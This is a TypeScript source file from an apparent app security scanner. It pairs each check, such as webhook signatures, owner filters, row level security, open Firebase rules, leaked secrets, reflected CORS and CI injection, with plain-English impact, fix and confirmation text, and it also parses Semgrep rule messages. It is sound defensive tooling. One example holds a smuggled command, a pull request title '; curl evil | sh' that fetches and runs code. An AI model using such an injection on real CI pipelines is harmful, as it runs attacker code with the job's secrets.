// Plain English text for every check and for scanner rules: what is wrong, what it lets someone do, how to fix it, and
// how to confirm the fix. Written for people who build with AI tools. The report never shows a tool's own message text.
import { readFileSync, readdirSync } from 'node:fs';
import { join } from 'node:path';

export interface Message { title: string; impact: string; fix: string; confirm: string; root: string }

const CHECKS: Record<string, Message> = {
  'check.api.webhook-verified-before-use': {
    title: 'Webhook is used even when its signature check fails',
    root: 'webhook: signature result does not stop the request',
    impact: 'Anyone who finds the webhook address can send a fake event, for example a payment that never happened, and the app acts on it.',
    fix: 'Check the provider signature on the raw request body first. If the check fails, return an error (400 or 401) straight away, before parsing or using the event. Never only log the failure.',
    confirm: 'Send the route a request with a wrong signature and confirm it is rejected, then rerun hullproof scan.',
  },
  'check.authz.owner-filter-on-id-read': {
    title: 'Record is read by id with no check that the caller owns it',
    root: 'authorization: read by id without an owner filter',
    impact: 'A signed in user can change the id in the request and read another user\'s record.',
    fix: 'Add the owner to the query, for example WHERE id = ? AND owner_id = ? with the signed in user\'s id from the session, or check the owner before returning the row.',
    confirm: 'Request another user\'s record id while signed in as a different user and confirm you get 404, then rerun hullproof scan.',
  },
  'check.ai.tool-owner-filter': {
    title: 'AI tool reads a record by id with no owner check',
    root: 'ai tool: read by id without an owner filter',
    impact: 'Text in a prompt can make the model ask the tool for any record id, so one user can read another user\'s data through the assistant.',
    fix: 'Pass the signed in user to every tool and filter each read by that user (WHERE id = ? AND owner_id = ?). Never let the model choose whose data is read.',
    confirm: 'Ask the assistant to read a record that belongs to another user and confirm it refuses, then rerun hullproof scan.',
  },
  'check.authz.admin-role-check': {
    title: 'Admin route lets in any signed in user',
    root: 'authorization: admin handler without a role check',
    impact: 'Any user with an account can call the admin route and do what only an admin should, such as changing roles or deleting users.',
    fix: 'In the server handler itself, load the user from the session and return 403 unless their role is admin. A check in the browser or a cookie check in middleware does not protect the route.',
    confirm: 'Call the admin route as a normal user and confirm it returns 403, then rerun hullproof scan.',
  },
  'check.db.rls-every-table': {
    title: 'Database table has no row level security',
    root: 'database: table without row level security',
    impact: 'With the public anon key that ships in every browser, anyone can read (and with grants, change) every row of this table through the Supabase Data API.',
    fix: 'Add a migration with alter table <name> enable row level security, then add policies that let each user reach only their own rows. Remove grants to anon that the app does not need.',
    confirm: 'Query the table with only the anon key and confirm no rows come back, then rerun hullproof scan.',
  },
  'check.db.firebase-rules-not-open': {
    title: 'Firebase database rules let anyone read or write',
    root: 'database: open Firebase rules',
    impact: 'Anyone with the app\'s public config can read or overwrite the whole database.',
    fix: 'Replace allow rules that are always true (or that expire by date) with rules that check request.auth and the owner of each document.',
    confirm: 'Run the Firebase rules emulator tests for an unauthenticated and a different user, then rerun hullproof scan.',
  },
  'check.storage.firebase-rules-not-open': {
    title: 'Firebase Storage rules let anyone read or write files',
    root: 'storage: open Firebase rules',
    impact: 'Anyone with the app\'s public config can download or replace every stored file.',
    fix: 'Limit each path to its owner, for example allow read, write: if request.auth.uid == uid on /users/{uid}/.',
    confirm: 'Try to fetch another user\'s file without signing in and confirm it is refused, then rerun hullproof scan.',
  },
  'check.secrets.no-secret-in-public-env': {
    title: 'Secret key is named with a public prefix and ends up in the browser',
    root: 'secrets: secret under a public env prefix',
    impact: 'Variables with prefixes such as NEXT_PUBLIC_, VITE_ or EXPO_PUBLIC_ are copied into the code every visitor downloads. A service role key there gives anyone full database access.',
    fix: 'Rename the variable without the public prefix, read it only in server code, and rotate the key in the provider dashboard because it may already be public.',
    confirm: 'Build the app and search the built files for the key name and value; neither should appear. Then rerun hullproof scan.',
  },
  'check.secrets.no-env-file-committed': {
    title: 'Environment file is committed to the repository',
    root: 'secrets: env file in git',
    impact: 'Anyone who can read the code, or its history, can read the values in the file.',
    fix: 'Remove the file from git, add it to .gitignore, keep only a .env.example with empty values, and rotate every real value it held.',
    confirm: 'git ls-files shows no .env file, then rerun hullproof scan.',
  },
  'check.web.cors-no-reflected-origin': {
    title: 'CORS allows whatever site asks',
    root: 'cors: request origin reflected',
    impact: 'Any website a signed in user visits can call your API with their cookies and read the answers.',
    fix: 'Compare the Origin header to an exact list of your own domains and only then send it back. Never copy the header as it is, and never pair a wildcard with credentials.',
    confirm: 'Send a request with Origin: https://evil.example and confirm no Access-Control-Allow-Origin comes back, then rerun hullproof scan.',
  },
  'check.log.no-credential-in-logs': {
    title: 'Session token or password is written to the logs',
    root: 'logging: credential in a log line',
    impact: 'Anyone who can read the logs (staff, a log vendor, a leaked log export) can take over the user\'s session.',
    fix: 'Remove the token, password or key from the log call. Log a user id or a short reference instead.',
    confirm: 'Sign in and read the server log; no token should appear. Then rerun hullproof scan.',
  },
  'check.supply.no-untrusted-event-in-run': {
    title: 'CI script expands text that outsiders control',
    root: 'supply: untrusted event data in a run step',
    impact: 'A pull request title like "; curl evil | sh" runs as a command in CI with the job\'s token and secrets.',
    fix: 'Pass the value through env: (for example TITLE: ${{ github.event.pull_request.title }}) and use "$TITLE" in the script.',
    confirm: 'No run: line holds ${{ github.event... }}, then rerun hullproof scan.',
  },
};

export function checkMessage(id: string): Message {
  return CHECKS[id] ?? { title: `Check ${id} failed`, root: `check ${id}`, impact: 'See the check definition.', fix: 'See the check definition.', confirm: 'Rerun hullproof scan.' };
}

export const checkIds = (): string[] => Object.keys(CHECKS);

// Scanner rules: the first sentence of the rule's own message is the title, the rest is the fix. Semgrep rule files are
// read from the engine's rules folder and the rule pack; Gitleaks, OSV Scanner and Trivy get a fixed text per tool.
const ruleCache = new Map<string, Map<string, string>>();
function semgrepMessages(rulesDir: string): Map<string, string> {
  let m = ruleCache.get(rulesDir);
  if (m) return m;
  m = new Map();
  let names: string[] = [];
  try { names = readdirSync(rulesDir).filter((n) => /\.ya?ml$/.test(n)).sort(); } catch { /* no rules folder */ }
  for (const n of names) {
    const lines = readFileSync(join(rulesDir, n), 'utf8').split('\n');
    let id: string | null = null;
    for (let i = 0; i < lines.length; i++) {
      const idm = /^\s*-\s*id:\s*["']?([\w.-]+)/.exec(lines[i]);
      if (idm) { id = idm[1]; continue; }
      const mm = /^(\s*)message:\s*(.*)$/.exec(lines[i]);
      if (!mm || !id) continue;
      let text = mm[2].trim();
      if (/^[>|]-?$/.test(text)) {
        const body: string[] = [];
        for (let k = i + 1; k < lines.length && (lines[k].trim() === '' || /^\s*/.exec(lines[k])![0].length > mm[1].length); k++) body.push(lines[k].trim());
        text = body.join(' ').trim();
      }
      m.set(id, text.replace(/^["']|["']$/g, ''));
      id = null;
    }
  }
  ruleCache.set(rulesDir, m);
  return m;
}

const firstSentence = (s: string): [string, string] => {
  const at = s.search(/\.\s/);
  return at < 0 ? [s.replace(/\.$/, ''), ''] : [s.slice(0, at), s.slice(at + 1).trim()];
};

export function ruleMessage(tool: string, ruleId: string, rulesDirs: string[]): Message {
  if (tool === 'semgrep') {
    // A later folder (the rule pack) wins over an earlier one for the same rule id.
    const text = rulesDirs.map((d) => semgrepMessages(d).get(ruleId)).filter(Boolean).pop();
    if (text) {
      const [title, rest] = firstSentence(text);
      return { title, root: `rule ${ruleId}`, impact: title + '.', fix: rest || 'Read the rule and change the code it points at.', confirm: 'Rerun hullproof scan; the rule no longer matches.' };
    }
    return { title: `Semgrep rule ${ruleId} matched`, root: `rule ${ruleId}`, impact: 'A code pattern linked to the requirement was found.', fix: 'Read the rule and change the code it points at.', confirm: 'Rerun hullproof scan; the rule no longer matches.' };
  }
  if (tool === 'gitleaks') return {
    title: 'A secret shaped value is committed', root: `secret ${ruleId}`,
    impact: 'Anyone who can read the code or its history can use the value if it is live.',
    fix: 'Rotate the value in the provider dashboard first, then move it to environment configuration and remove it from the code. Removing it from history does not make it safe again.',
    confirm: 'The provider shows the old value revoked, then rerun hullproof scan.',
  };
  if (tool === 'osv-scanner') return {
    title: `Dependency has a known vulnerability (${ruleId})`, root: `advisory ${ruleId}`,
    impact: 'Code with a published vulnerability is part of the app.',
    fix: 'Upgrade the package to a fixed version, or record why the vulnerable code is not reachable.',
    confirm: 'Rerun hullproof scan with --allow-network; the advisory no longer appears.',
  };
  return {
    title: `${tool} check ${ruleId} matched`, root: `${tool} ${ruleId}`,
    impact: 'A configuration pattern linked to the requirement was found.',
    fix: `Read ${tool} check ${ruleId} and change the configuration it points at.`,
    confirm: 'Rerun hullproof scan; the check no longer matches.',
  };
}
